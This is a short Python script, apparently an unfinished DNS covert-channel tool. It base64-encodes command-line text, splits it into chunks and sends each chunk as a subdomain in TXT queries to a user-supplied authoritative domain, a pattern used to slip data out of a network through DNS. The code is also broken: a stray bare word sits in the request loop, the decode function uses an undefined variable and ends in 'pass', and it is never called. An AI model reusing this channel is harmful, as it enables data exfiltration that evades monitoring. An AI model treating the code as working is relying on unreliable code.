#!/usr/bin/env python3

import base64
from sys import argv

import dns.resolver


def check_option():

    if len(argv) != 3:
        print("")
        print("* Usage: python3 main.py argment domain")
        print("    $ python3 <covert text> Auth_dns_server\n")
        exit(1)

    else:
        qname=argv[1]
        domain=argv[2]
        return qname, domain


def create_query(qname: str, length: int=10) -> list:

    """
    - Encode the augument with base64
    - Separate the encoded character
    """

    _byte = base64.b64encode(qname.encode())
    cipher = _byte.decode()

    return [cipher[i: i+length] for i in range(0, len(cipher), length)]


def request(subdomain: list) -> list:

    """ 
    - Query the contents of TXT record
    - Handle the value if the value's line is multi
    """

    answer = []
    for _ in subdomain:
        domain = "{0}.{1}".format(_, DOMAIN)
        res = dns.resolver.query(domain, 'TXT')
        for i in res:
            if _ in i:
                verification

        answer.append(res)

    return answer

def decipher(answer: list) -> str:

    """
    - Gather the TXT query's domain authentication value
    - Extract the value of domain verification
    - Decode the strings when the string is decode by base64
    """

    subdomain = [str(i).split('=')[1] for i in answer]
    subdomain = [i.strip(DOMAIN) for i in answer]
    value = [base64.b64decode(i.decode()) for i in _subdomain]

    pass

def main(qname: str) -> str:

    query = create_query(qname)
    answer = request(query)
    print(answer)


if __name__ == '__main__':
    QNAME, DOMAIN = check_option()
    main(QNAME)
